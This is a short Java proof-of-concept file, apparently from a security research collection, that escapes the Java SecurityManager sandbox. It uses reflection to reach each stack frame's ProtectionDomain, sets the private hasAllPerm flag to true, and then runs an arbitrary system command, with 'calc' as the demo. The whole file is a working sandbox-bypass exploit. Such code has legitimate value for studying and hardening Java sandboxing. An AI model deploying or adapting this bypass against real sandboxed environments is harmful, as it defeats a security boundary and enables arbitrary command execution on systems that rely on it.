package com.SugarP1g.securityManager;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;

public class ReflectBypass2 {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Running setHasAllPerm0()");
        setHasAllPerm0("calc");
    }

    public static void setHasAllPerm0(String command) throws Exception {
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) {
            try {
                Class clz = Class.forName(stackTraceElement.getClassName());
                //利用反射调用getProtectionDomain0方法
                Method getProtectionDomain = clz.getClass().getDeclaredMethod("getProtectionDomain0", null);
                getProtectionDomain.setAccessible(true);
                ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);

                if (pd != null) {
                    Field field = pd.getClass().getDeclaredField("hasAllPerm");
                    field.setAccessible(true);
                    field.set(pd, true);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        Runtime.getRuntime().exec(command);
    }
}
